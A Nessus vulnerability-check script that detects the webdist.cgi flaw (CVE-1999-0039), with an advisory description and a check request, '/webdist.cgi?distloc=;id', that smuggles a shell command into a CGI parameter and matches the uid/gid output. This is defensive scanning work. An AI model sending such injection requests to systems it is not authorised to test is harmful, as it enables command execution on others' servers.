#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

 desc["english"] = "
Synopsis :

The remote web server contains a CGI script that is prone to arbitrary
code execution. 

Description :

The 'webdist.cgi' CGI is installed.  This script has a well-known
security flaw that lets anyone execute arbitrary commands with the
privileges of the web server user id. 

See also :

http://www.cert.org/advisories/CA-1997-12.html
http://archives.neohapsis.com/archives/bugtraq/1997_2/0182.html

Solution : 

Remove this CGI.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if(description)
{
 script_id(10299);
 script_bugtraq_id(374);
 script_version ("$Revision: 1.33 $");
 script_cve_id("CVE-1999-0039");
 
 name["english"] = "webdist.cgi";
 script_name(english:name["english"]);
 
 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of webdist.cgi";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);


http_check_remote_code(
  extra_dirs:"",
  check_request:"/webdist.cgi?distloc=;id",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  description:desc["english"],
  port:port
);
